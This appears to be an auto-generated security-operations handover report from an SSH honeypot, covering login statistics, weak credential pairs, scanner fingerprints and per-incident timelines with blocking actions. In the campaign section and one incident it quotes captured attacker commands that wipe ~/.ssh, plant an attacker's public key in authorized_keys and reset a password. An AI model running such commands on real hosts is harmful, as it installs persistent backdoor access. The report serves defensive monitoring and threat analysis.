# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-13 |
| **Generated At** | 2026-11-13T18:58:47Z |
| **Shift Time** | 18:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **575** |
| Confirmed Threats | **508** |
| False Positives Filtered | **67** (11.7%) |
| Unique Attacker IPs | **339** |
| Countries of Origin | **55** |
| High Severity Cases | **387** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **188** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **2528** |
| Unique Credential Pairs | **1510** |
| Unique Usernames | **463** |
| Unique Passwords | **1032** |
| Successful Auth Pairs | **2324** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 938 |
| `admin` | 121 |
| `ubuntu` | 63 |
| `support` | 53 |
| `rootssssss23424123123` | 44 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 107 |
| `123` | 61 |
| `1234` | 57 |
| `rootssssss23424123123` | 44 |
| `root3245gs5662d34111111111` | 43 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 44 |
| `root` | `root3245gs5662d34111111111` | 37 |
| `support` | `support` | 28 |
| `admin` | `admin` | 18 |
| `345gs5662d34` | `345gs5662d34` | 16 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `blank` | `blank8` | `10.0.0.73` | 2026-11-13T02:56:07 |
| `orangepi` | `orangepi` | `131.161.184.46` | 2026-11-13T02:58:24 |
| `orangepi` | `orangepi` | `103.93.37.178` | 2026-11-13T02:58:33 |
| `orangepi` | `orangepi` | `125.139.124.120` | 2026-11-13T03:05:07 |
| `orangepi` | `orangepi` | `223.75.156.89` | 2026-11-13T03:05:21 |
| `root` | `admin` | `61.12.84.172` | 2026-11-13T03:07:01 |
| `nobody` | `nobody123456` | `10.0.0.73` | 2026-11-13T03:08:37 |
| `root` | `r00tp@ssw0rd` | `119.209.12.20` | 2026-11-13T03:10:10 |
| `rootssssss23424123123` | `rootssssss23424123123` | `119.209.12.20` | 2026-11-13T03:10:14 |
| `root` | `root3245gs5662d34111111111` | `119.209.12.20` | 2026-11-13T03:10:16 |
| `Test` | `111` | `120.141.20.38` | 2026-11-13T03:14:35 |
| `Test` | `111` | `73.5.123.218` | 2026-11-13T03:14:44 |
| `admin` | `admin` | `195.178.110.78` | 2026-11-13T03:44:45 |
| `support` | `support` | `10.0.0.73` | 2026-11-13T03:50:56 |
| `blank` | `blank8` | `65.20.198.159` | 2026-11-13T03:53:12 |
| `blank` | `blank8` | `58.222.86.210` | 2026-11-13T03:53:23 |
| `nobody` | `nobody123456` | `85.195.9.20` | 2026-11-13T03:55:10 |
| `nobody` | `nobody123456` | `46.59.109.240` | 2026-11-13T03:55:18 |
| `support` | `support` | `176.53.159.196` | 2026-11-13T03:58:07 |
| `root` | `abcd1234` | `70.167.235.152` | 2026-11-13T04:00:49 |
_… 2304 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **575** |
| Sessions with Fingerprint | **28** |
| Unique HASSH Fingerprints | **28** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 171 |
| OpenSSH | 160 |
| libssh | 61 |
| PuTTY | 4 |
| Nmap scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 148 | 144 |
| `2ec37a7cc8da...` | Mirai/variant | 97 | 1 |
| `f555226df196...` | Mirai/variant | 54 | 28 |
| `16443846184e...` | Generic scanner | 22 | 4 |
| `7d01d047ace6...` | Mirai/variant | 14 | 4 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 148 | 144 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 97 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 54 | 28 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 22 | 4 | Generic scanner |
| `7d01d047ace6...` | Go SSH scanner | 14 | 4 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 8 | 8 | — |
| `eff4c24daffc...` | Go SSH scanner | 7 | 1 | Modern SSH client |
| `03a80b21afa8...` | libssh | 6 | 2 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **123** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 45 | 28 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "user5\nmOcPuNhsDa2M\nmOcPuNhsDa2M"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `14.103.111.16`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `200.58.81.226`, `39.191.29.160`, `117.72.47.157`, `8.217.27.132`, `154.92.17.128`, `106.75.77.231`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **339** |
| Unique ASNs | **155** |
| High-Risk ASNs | **141** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 53 | HIGH |
| `AS22773` | Cox Communications Inc. | 21 | HIGH |
| `AS4766` | Korea Telecom | 13 | HIGH |
| `AS396982` | Google LLC | 9 | HIGH |
| `AS213412` | ONYPHE SAS | 8 | LOW |
| `AS398324` | Censys, Inc. | 7 | HIGH |
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS8075` | Microsoft Corporation | 6 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (377)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-930ead9ee10e

| Field | Detail |
|---|---|
| **Source IP** | `131.161.184[.]46` |
| **First Seen** | 2026-11-13 02:58 |
| **Last Seen** | 2026-11-13 02:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 02:58:21` | `cowrie.session.connect` |
| `2026-11-13 02:58:21` | `cowrie.client.version` |
| `2026-11-13 02:58:21` | `cowrie.client.kex` |
| `2026-11-13 02:58:24` | `cowrie.login.success` |
| `2026-11-13 02:58:24` | `cowrie.direct-tcpip.request` |
| `2026-11-13 02:58:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.161.184[.]46` to AbuseIPDB if not already reported
- [ ] Block `131.161.184[.]46` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcb6ddb9da2e

| Field | Detail |
|---|---|
| **Source IP** | `103.93.37[.]178` |
| **First Seen** | 2026-11-13 02:58 |
| **Last Seen** | 2026-11-13 02:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 02:58:30` | `cowrie.session.connect` |
| `2026-11-13 02:58:31` | `cowrie.client.version` |
| `2026-11-13 02:58:31` | `cowrie.client.kex` |
| `2026-11-13 02:58:33` | `cowrie.login.success` |
| `2026-11-13 02:58:34` | `cowrie.direct-tcpip.request` |
| `2026-11-13 02:58:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.93.37[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.93.37[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b575f64ca2c

| Field | Detail |
|---|---|
| **Source IP** | `125.139.124[.]120` |
| **First Seen** | 2026-11-13 03:05 |
| **Last Seen** | 2026-11-13 03:05 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 03:05:03` | `cowrie.session.connect` |
| `2026-11-13 03:05:04` | `cowrie.client.version` |
| `2026-11-13 03:05:04` | `cowrie.client.kex` |
| `2026-11-13 03:05:07` | `cowrie.login.success` |
| `2026-11-13 03:05:08` | `cowrie.direct-tcpip.request` |
| `2026-11-13 03:05:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.139.124[.]120` to AbuseIPDB if not already reported
- [ ] Block `125.139.124[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49ff5b2c06ab

| Field | Detail |
|---|---|
| **Source IP** | `223.75.156[.]89` |
| **First Seen** | 2026-11-13 03:05 |
| **Last Seen** | 2026-11-13 03:05 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 03:05:18` | `cowrie.session.connect` |
| `2026-11-13 03:05:18` | `cowrie.client.version` |
| `2026-11-13 03:05:18` | `cowrie.client.kex` |
| `2026-11-13 03:05:21` | `cowrie.login.success` |
| `2026-11-13 03:05:22` | `cowrie.direct-tcpip.request` |
| `2026-11-13 03:05:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.75.156[.]89` to AbuseIPDB if not already reported
- [ ] Block `223.75.156[.]89` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10d774d433d4

| Field | Detail |
|---|---|
| **Source IP** | `61.12.84[.]172` |
| **First Seen** | 2026-11-13 03:06 |
| **Last Seen** | 2026-11-13 03:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 03:06:58` | `cowrie.session.connect` |
| `2026-11-13 03:06:59` | `cowrie.client.version` |
| `2026-11-13 03:06:59` | `cowrie.client.kex` |
| `2026-11-13 03:07:01` | `cowrie.login.success` |
| `2026-11-13 03:07:02` | `cowrie.direct-tcpip.request` |
| `2026-11-13 03:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.84[.]172` to AbuseIPDB if not already reported
- [ ] Block `61.12.84[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e87f0a7f368

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-11-13 03:10 |
| **Last Seen** | 2026-11-13 03:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 03:10:09` | `cowrie.session.connect` |
| `2026-11-13 03:10:09` | `cowrie.client.version` |
| `2026-11-13 03:10:09` | `cowrie.client.kex` |
| `2026-11-13 03:10:10` | `cowrie.login.success` |
| `2026-11-13 03:10:11` | `cowrie.session.params` |
| `2026-11-13 03:10:11` | `cowrie.command.input` |
| `2026-11-13 03:10:11` | `cowrie.command.failed` |
| `2026-11-13 03:10:11` | `cowrie.log.closed` |
| `2026-11-13 03:10:12` | `cowrie.session.params` |
| `2026-11-13 03:10:12` | `cowrie.command.input` |
| `2026-11-13 03:10:12` | `cowrie.session.file_download` |
| `2026-11-13 03:10:12` | `cowrie.log.closed` |
| `2026-11-13 03:10:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b80e6952c24

| Field | Detail |
|---|---|
| **Source IP** | `119.209.12[.]20` |
| **First Seen** | 2026-11-13 03:10 |
| **Last Seen** | 2026-11-13 03:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 03:10:13` | `cowrie.session.connect` |
| `2026-11-13 03:10:13` | `cowrie.client.version` |
| `2026-11-13 03:10:13` | `cowrie.client.kex` |
| `2026-11-13 03:10:14` | `cowrie.login.success` |
| `2026-11-13 03:10:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.209.12[.]20` to AbuseIPDB if not already reported
- [ ] Block `119.209.12[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7e629a39411

| Field | Detail |
|---|---|
| **Source IP** | `120.141.20[.]38` |
| **First Seen** | 2026-11-13 03:14 |
| **Last Seen** | 2026-11-13 03:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 03:14:32` | `cowrie.session.connect` |
| `2026-11-13 03:14:33` | `cowrie.client.version` |
| `2026-11-13 03:14:33` | `cowrie.client.kex` |
| `2026-11-13 03:14:35` | `cowrie.login.success` |
| `2026-11-13 03:14:36` | `cowrie.direct-tcpip.request` |
| `2026-11-13 03:14:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.141.20[.]38` to AbuseIPDB if not already reported
- [ ] Block `120.141.20[.]38` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15e3a9f6c325

| Field | Detail |
|---|---|
| **Source IP** | `73.5.123[.]218` |
| **First Seen** | 2026-11-13 03:14 |
| **Last Seen** | 2026-11-13 03:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 03:14:41` | `cowrie.session.connect` |
| `2026-11-13 03:14:42` | `cowrie.client.version` |
| `2026-11-13 03:14:42` | `cowrie.client.kex` |
| `2026-11-13 03:14:44` | `cowrie.login.success` |
| `2026-11-13 03:14:44` | `cowrie.direct-tcpip.request` |
| `2026-11-13 03:14:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `73.5.123[.]218` to AbuseIPDB if not already reported
- [ ] Block `73.5.123[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-617669a4224c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]78` |
| **First Seen** | 2026-11-13 03:44 |
| **Last Seen** | 2026-11-13 03:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 03:44:44` | `cowrie.session.connect` |
| `2026-11-13 03:44:45` | `cowrie.login.success` |
| `2026-11-13 03:44:45` | `cowrie.session.params` |
| `2026-11-13 03:44:45` | `cowrie.log.closed` |
| `2026-11-13 03:44:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]78` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff265a317545

| Field | Detail |
|---|---|
| **Source IP** | `65.20.198[.]159` |
| **First Seen** | 2026-11-13 03:53 |
| **Last Seen** | 2026-11-13 03:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 03:53:09` | `cowrie.session.connect` |
| `2026-11-13 03:53:09` | `cowrie.client.version` |
| `2026-11-13 03:53:09` | `cowrie.client.kex` |
| `2026-11-13 03:53:12` | `cowrie.login.success` |
| `2026-11-13 03:53:13` | `cowrie.direct-tcpip.request` |
| `2026-11-13 03:53:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.198[.]159` to AbuseIPDB if not already reported
- [ ] Block `65.20.198[.]159` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9211d499406d

| Field | Detail |
|---|---|
| **Source IP** | `58.222.86[.]210` |
| **First Seen** | 2026-11-13 03:53 |
| **Last Seen** | 2026-11-13 03:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 03:53:19` | `cowrie.session.connect` |
| `2026-11-13 03:53:21` | `cowrie.client.version` |
| `2026-11-13 03:53:21` | `cowrie.client.kex` |
| `2026-11-13 03:53:23` | `cowrie.login.success` |
| `2026-11-13 03:53:24` | `cowrie.direct-tcpip.request` |
| `2026-11-13 03:53:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.222.86[.]210` to AbuseIPDB if not already reported
- [ ] Block `58.222.86[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4da5ff91f80

| Field | Detail |
|---|---|
| **Source IP** | `85.195.9[.]20` |
| **First Seen** | 2026-11-13 03:55 |
| **Last Seen** | 2026-11-13 03:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 03:55:09` | `cowrie.session.connect` |
| `2026-11-13 03:55:09` | `cowrie.client.version` |
| `2026-11-13 03:55:09` | `cowrie.client.kex` |
| `2026-11-13 03:55:10` | `cowrie.login.success` |
| `2026-11-13 03:55:11` | `cowrie.direct-tcpip.request` |
| `2026-11-13 03:55:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.195.9[.]20` to AbuseIPDB if not already reported
- [ ] Block `85.195.9[.]20` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a2cb597bdf0

| Field | Detail |
|---|---|
| **Source IP** | `46.59.109[.]240` |
| **First Seen** | 2026-11-13 03:55 |
| **Last Seen** | 2026-11-13 03:55 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 03:55:16` | `cowrie.session.connect` |
| `2026-11-13 03:55:17` | `cowrie.client.version` |
| `2026-11-13 03:55:17` | `cowrie.client.kex` |
| `2026-11-13 03:55:18` | `cowrie.login.success` |
| `2026-11-13 03:55:18` | `cowrie.direct-tcpip.request` |
| `2026-11-13 03:55:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.59.109[.]240` to AbuseIPDB if not already reported
- [ ] Block `46.59.109[.]240` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f924aaa81c04

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-13 03:58 |
| **Last Seen** | 2026-11-13 03:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 03:58:06` | `cowrie.session.connect` |
| `2026-11-13 03:58:06` | `cowrie.client.version` |
| `2026-11-13 03:58:06` | `cowrie.client.kex` |
| `2026-11-13 03:58:07` | `cowrie.login.success` |
| `2026-11-13 03:58:07` | `cowrie.direct-tcpip.request` |
| `2026-11-13 03:58:07` | `cowrie.direct-tcpip.data` |
| `2026-11-13 03:58:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1476cd5e2398

| Field | Detail |
|---|---|
| **Source IP** | `70.167.235[.]152` |
| **First Seen** | 2026-11-13 04:00 |
| **Last Seen** | 2026-11-13 04:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 04:00:46` | `cowrie.session.connect` |
| `2026-11-13 04:00:47` | `cowrie.client.version` |
| `2026-11-13 04:00:47` | `cowrie.client.kex` |
| `2026-11-13 04:00:49` | `cowrie.login.success` |
| `2026-11-13 04:00:50` | `cowrie.direct-tcpip.request` |
| `2026-11-13 04:00:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `70.167.235[.]152` to AbuseIPDB if not already reported
- [ ] Block `70.167.235[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6db295eeee7a

| Field | Detail |
|---|---|
| **Source IP** | `98.122.215[.]23` |
| **First Seen** | 2026-11-13 04:00 |
| **Last Seen** | 2026-11-13 04:01 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-13 04:00:55` | `cowrie.session.connect` |
| `2026-11-13 04:00:56` | `cowrie.client.version` |
| `2026-11-13 04:00:56` | `cowrie.client.kex` |
| `2026-11-13 04:00:57` | `cowrie.login.success` |
| `2026-11-13 04:00:58` | `cowrie.direct-tcpip.request` |
| `2026-11-13 04:01:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.122.215[.]23` to AbuseIPDB if not already reported
- [ ] Block `98.122.215[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf42a1d9a885

| Field | Detail |
|---|---|
| **Source IP** | `125.139.124[.]120` |
| **First Seen** | 2026-11-13 04:02 |
| **Last Seen** | 2026-11-13 04:02 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
